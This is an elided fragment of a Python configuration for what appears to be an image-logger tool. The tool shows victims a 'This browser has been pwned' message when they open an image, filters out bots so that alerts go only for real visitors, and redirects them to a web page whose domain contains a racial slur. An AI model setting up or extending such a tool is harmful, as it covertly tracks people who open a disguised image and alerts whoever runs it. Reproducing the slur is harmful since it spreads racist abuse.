...
config = {
    ...
    "message": { # Show a custom message when the user opens the image
        ...
        "message": "This browser has been pwned by 777znt💉", # Message to show
    ...
    "antiBot": 2, # Prevents bots from triggering the alert
                ...
                # 4 = Don't send an alert whet's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": True, # Redirect to a webpage?
        "page": "https://niggashop.vercel.app/" # Link to the webpage to redirect to 
    },
